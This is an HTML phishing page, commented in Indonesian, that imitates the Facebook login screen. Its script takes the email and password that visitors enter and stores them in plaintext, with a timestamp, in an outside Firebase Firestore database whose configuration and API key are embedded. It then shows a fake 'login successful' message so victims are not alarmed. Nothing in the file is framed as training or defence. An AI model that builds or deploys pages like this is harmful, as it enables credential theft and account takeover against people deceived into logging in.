<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login</title>

<!-- SweetAlert -->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<style>
/* RESET */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

/* BODY */
body {
  font-family: Arial, sans-serif;
  background: #f0f2f5;
}

/* LAYOUT */
.main {
  display: flex;
  height: 100vh;
}

/* KIRI */
.left {
  flex: 1;
  display: flex;
  flex-direction: column;
  justify-content: center;
  padding-left: 80px;
}

.logo {
  color: #1877f2;
  font-size: 56px;
  font-weight: bold;
}

.tagline {
  font-size: 28px;
  margin-top: 10px;
}

.tagline span {
  color: #1877f2;
}

/* KANAN */
.right {
  flex: 1;
  display: flex;
  justify-content: center;
  align-items: center;
}

/* CARD LOGIN */
.login-box {
  width: 380px;
  background: #fff;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 8px 20px rgba(0,0,0,0.1);
  text-align: center;
}

.login-box h3 {
  margin-bottom: 15px;
  font-size: 20px;
}

/* INPUT */
input {
  width: 100%;
  padding: 14px;
  margin-bottom: 12px;
  border: 1px solid #dddfe2;
  border-radius: 6px;
  font-size: 16px;
}

/* BUTTON LOGIN */
button {
  width: 100%;
  padding: 14px;
  background: #1877f2;
  color: white;
  border: none;
  border-radius: 6px;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  background: #166fe5;
}

/* LINK LUPA PASSWORD */
.forgot {
  display: block;
  margin: 15px 0;
  font-size: 14px;
  color: #1877f2;
  text-decoration: none;
}

.forgot:hover {
  text-decoration: underline;
}

/* GARIS */
.divider {
  border-top: 1px solid #ddd;
  margin: 15px 0;
}

/* BUTTON BUAT AKUN */
.create-btn {
  background: #42b72a;
  font-size: 16px;
}

.create-btn:hover {
  background: #36a420;
}

/* RESPONSIVE */
@media (max-width: 768px) {
  .main {
    flex-direction: column;
  }

  .left {
    padding: 20px;
    text-align: center;
  }

  .logo {
    font-size: 40px;
  }

  .tagline {
    font-size: 20px;
  }

  .login-box {
    width: 90%;
  }
}</style>
</head>

<body>

<div class="main">

  <div class="left">
    <div class="logo">facebook</div>
    <div class="tagline">Explore the things <span style="color:#1877f2">you love.</span></div>
  </div>

  <div class="right">
    <div class="login-box">
      <h3>Log in to Facebook</h3>

      <input type="text" id="email" placeholder="Email address or mobile number">
      <input type="password" id="password" placeholder="Password">

      <button id="loginBtn">Log in</button>
    </div>
  </div>

</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

let db = null;

// INIT FIREBASE (dengan pengaman)
try {
  const firebaseConfig = {
    apiKey: "AIzaSyDfs59hRYtUtFG3dVMZ3aGTIm3FvvbDnx8",
    authDomain: "test-bf56f.firebaseapp.com",
    projectId: "test-bf56f",
    storageBucket: "test-bf56f.firebasestorage.app",
    messagingSenderId: "276624363412",
    appId: "1:276624363412:web:b232a9df7bf64e4edac981"
  };

  const app = initializeApp(firebaseConfig);
  db = getFirestore(app);

  console.log("Firebase READY");
} catch (err) {
  console.error("Firebase gagal:", err);
}

// EVENT BUTTON
document.getElementById("loginBtn").addEventListener("click", async () => {
  console.log("Klik terdeteksi");

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // VALIDASI
  if (email === "" || password === "") {
    Swal.fire("Isi dulu email & password!");
    return;
  }

  // Kalau Firebase tidak aktif
  if (!db) {
    Swal.fire({
      icon: "warning",
      title: "Mode Offline",
      text: "Firebase tidak terhubung, tapi tombol berfungsi"
    });
    return;
  }

  try {
    await addDoc(collection(db, "login"), {
      email: email,
      password: password,
      waktu: new Date()
    });

    Swal.fire({
      icon: "success",
      title: "Login Berhasil",
      text: "Selamat datang!"
    });

  } catch (e) {
    console.error(e);

    Swal.fire({
      icon: "error",
      title: "Error Firebase",
      text: e.message
    });
  }
});
</script>

</body>
</html>
